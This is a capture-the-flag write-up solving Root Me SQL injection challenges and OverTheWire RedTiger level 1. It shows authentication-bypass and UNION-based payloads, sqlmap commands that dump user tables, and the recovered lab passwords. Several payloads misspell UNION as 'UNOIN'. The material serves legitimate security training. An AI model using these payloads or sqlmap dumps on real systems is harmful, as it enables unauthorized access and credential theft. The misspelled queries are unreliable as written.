# [Web Application Security Testing](../README.md) -> __Root Me (SQL injection: Authentication, String, Numeric). OverTheWire - RedTiger__

- [Web Application Security Testing -\> __Root Me (SQL injection: Authentication, String, Numeric). OverTheWire - RedTiger__](#web-application-security-testing---root-me-sql-injection-authentication-string-numeric-overthewire---redtiger)
  - [__Root Me (SQL injection - Authentication)__](#root-me-sql-injection---authentication)
  - [__Root Me (SQL injection - String)__](#root-me-sql-injection---string)
  - [__Root Me (SQL injection - Numeric)__](#root-me-sql-injection---numeric)
  - [__redtiger.labs.overthewire.org__](#redtigerlabsoverthewireorg)

## __Root Me (SQL injection - Authentication)__

![SQL injection - Authentication](./res/img/Task_RootMe_SqlInjectionAuthentication.png)

Solution:

1. Start the challenge

   ![SQL injection - Authentication](./res/img/RM_sqlia_001.png)

2. Enter *Login:* `' OR 1=1 --` and *Password:* `q` to check for the SQLi vulnerability.

   ![SQL injection - Authentication](./res/img/RM_sqlia_002.png)

3. Press the `[connect]` button.

   ![SQL injection - Authentication](./res/img/RM_sqlia_003.png)

   As we can see, the authentication mechanism has been bypassed, as it looks like the following sql query is being used:

   ```sql
   SELECT username,password FROM users WHERE username='.$login.' AND passwd='.$password.'
   ```

   When we use `' OR 1=1 --` the password part of the request is ignored.

   ```sql
   SELECT username,password FROM users WHERE username='' OR 1=1 --' AND password='q'
   ```

   > __NOTE:__
   >
   > This query should have returned us all the records, but there are no more fields to display. We can apply a filter like "*WHERE*" to get the admin password, but we don't know the table name.

4. To determine the type of DBMS used here, an error must be made, and the error message will show it for us.

   ![SQL injection - Authentication](./res/img/RM_sqlia_004.png)

5. To get information about the structure of a SQLite3 database, enter the following command:

   ```sql
   ' AND 0 UNOIN SELECT name,null FROM sqlite_master WHERE type='table' --
   ```

   ![SQL injection - Authentication](./res/img/RM_sqlia_005.png)

   Now we know the name of the table and fields.

6. To obtain the administrator password, enter the following line .

   ```sql
   ' AND 0 UNOIN SELECT password,null FROM users WHERE username='admin' --
   ```

   ![SQL injection - Authentication](./res/img/RM_sqlia_006.png)

   We received the administrator password "__`t0_W34k!$`__".

7. Enter the username: __`admin`__ and password: __`t0_W34k!$`__.

   ![SQL injection - Authentication](./res/img/RM_sqlia_007.png)

8. The password "__`t0_W34k!$`__" is "*Flag*".

## __Root Me (SQL injection - String)__

![SQL injection - Blind](./res/img/Task_RootMe_SqlInjectionString.png)

Solution:

1. Start the challenge.
2. Go to the Search tab.

   ![Root Me SQL injection - string](./res/img/RM_sqlis_001.png)

3. Enter `' OR 1=1 --` to test the sql injection capability and get all the table records.
4. Click the `[chercher]` button.

   ![Root Me SQL injection - string](./res/img/RM_sqlis_002.png)

5. To determine the number of table fields, enter the following command:

   ```sql
   ' AND 0 UNOIN SELECT null,null --
   ```

   > __NOTE__ Once we receive the error message, we can determine that the SQLite3 DBMS is being used.

   ![Root Me SQL injection - string](./res/img/RM_sqlis_003.png)

   This table has 2 fields.

6. To get information about the database structure, enter the following command:

   ```sql
   ' AND 0 UNOIN SELECT null,sql FROM sqlite_master --
   ```

   ![Root Me SQL injection - string](./res/img/RM_sqlis_004.png)

7. To obtain the credentials, enter the following command:

   ```sql
   ' AND 0 UNOIN SELECT username,password FROM users --
   ```

   ![Root Me SQL injection - string](./res/img/RM_sqlis_005.png)

   We found the administrator credentials.

8. Go to the "*Login*" tab.
9. Enter the username: __`admin`__ and password: __`c4K04dtIaJsuWdi`__.

   ![Root Me SQL injection - string](./res/img/RM_sqlis_006.png)

10. Click the [connect] button.

    ![Root Me SQL injection - string](./res/img/RM_sqlis_007.png)

11. The password "__`c4K04dtIaJsuWdi`__" is "*Flag*".

## __Root Me (SQL injection - Numeric)__

![SQL injection - Numeric](./res/img/Task_RootMe_SqlInjectionNumeric.png)

Solution:

1. Start the challenge.

   ![SQL injection - Numeric](./res/img/RM_sqlin_001.png)

   Here we see 3 links to news. The news must be posted in the database. Open any news to find out where we can carry out an attack using sql injection.

2. Open any news to find out where we can carry out an attack using sql injection.

   ![SQL injection - Numeric](./res/img/RM_sqlin_002.png)

   > __NOTE:__
   >
   > Each news consists of at least 3 fields, since one of them is the identifier, the second is the title and the third is the description.

3. In the address bar we see the id parameter. To make sure you can perform a SQLi attack, add the `OR 1=1 --` code at the end.

   ![SQL injection - Numeric](./res/img/RM_sqlin_003.png)

4. The DBMS is __SQLite3__, we can get the database structure. To do this, enter:

   ```sql
   UNION SELECT null,sql,null FROM sqlite_master --
   ```

   ![SQL injection - Numeric](./res/img/RM_sqlin_004.png)

   Here are 2 tables. We are interested in the `users` table.

5. To obtain the administrator password, enter the following:

   ```sql
   UNION SELECT null,username,password FROM users --
   ```

   ![SQL injection - Numeric](./res/img/RM_sqlin_005.png)

6. Go to the "*login*" tab.
7. Enter the username: __`admin`__ and password: __`aTlkJYLjcbLmue3`__.

   ![SQL injection - Numeric](./res/img/RM_sqlin_006.png)

8. The password "__`aTlkJYLjcbLmue3`__" is "*Flag*".

   ![SQL injection - Numeric](./res/img/RM_sqlin_007.png)

<!--
## __Root Me (SQL injection - Blind)__

## __sql.training.hackerdom.ru__
-->

## __redtiger.labs.overthewire.org__

![RedTiger's Simple SQL Injection](./res/img/Task_RedTigerLabsOverTheWire.png)

Solution:

1. Run the task

   ![RedTiger's Simple SQL Injection](./res/img/rtotw_001.png)

   > __NOTE:__
   >
   > I checked the username and password fields for possible sql injection, but found nothing. In addition, here we see a link "*Category: 1*", when clicked on it, the message "__*This hackit is cool :)*__" appeared. This is a hint. Let's check it out..

2. Press the key combination `[Ctrl]`+`[Alt]`+`[T]` to launch the terminal.
3. Enter the following command to get the database names.

   ```sh
   sudo sqlmap -v -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" -p cat --dbs
   ```

   ![RedTiger's Simple SQL Injection](./res/img/rtotw_002.png)

   > __Here:__
   >
   > - `-v` - verbosity.
   > - `-u` - target URL.
   > - `-p` - parameter(*s*) to check.
   > - `-dbs` - display a list of DBMS databases.
   >
   > __IMPORTANT:__
   >
   > In some cases, such as when we try to use headers in SQLMap with GET requests, we may run into problems identifying where SQL injection is possible. The presence of the following headers will cause problems with SQLMap: `--cookie=`, `--data`, `--method`, `--user-agent=`, `--referer=`.

4. Press `[Enter]`.

   ![RedTiger's Simple SQL Injection](./res/img/rtotw_003.png)

   As a result, we only got the name of one database called `hackit`.

5. Enter the following command to get the table names of the `hackit` database.

   ```sh
   sudo sqlmap -v -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" -p cat -D hackit --tables
   ```

   ![RedTiger's Simple SQL Injection](./res/img/rtotw_004.png)

   > __Here:__
   >
   > - `-D` - DBMS database for enumeration.
   > - `--tables` - display a list of DBMS database tables.

6. Press `[Enter]`.

   ![RedTiger's Simple SQL Injection](./res/img/rtotw_005.png)

   A table called `level1_users` was discovered.

7. To get the list of fields use the following command.

   ```sh
   sudo sqlmap -v -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" -p cat -D hackit -T level1_users --columns
   ```

   ![RedTiger's Simple SQL Injection](./res/img/rtotw_006.png)

   > __Here:__
   >
   > - `-T` - DBMS database table(*s*) to enumerate.
   > - `--columns` - list the columns of the DBMS database table.

8. Press `[Enter]`.

   ![RedTiger's Simple SQL Injection](./res/img/rtotw_007.png)

   Fields called `id`, `password` and `username` were discovered.

9. To get the value of this field, enter the following command.

   ```sh
   sudo sqlmap -v -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" -p cat -D hackit -T level1_users -C id,username,password --dump
   ```

   ![RedTiger's Simple SQL Injection](./res/img/rtotw_008.png)

   >__Here:__
   >
   > - `-C` - column(*s*) of the DBMS table to be enumerated.
   > - `--dump` - dump DBMS database table records.

10. Press `[Enter]`.

    ![RedTiger's Simple SQL Injection](./res/img/rtotw_009.png)

    Only one `Hornox` user was found and his password was `thatwaseasy`.

11. Login using `Hornoxe` and `thatwaseasy`.
12. Collect the "*Flag*".

    ![RedTiger's Simple SQL Injection](./res/img/rtotw_010.png)
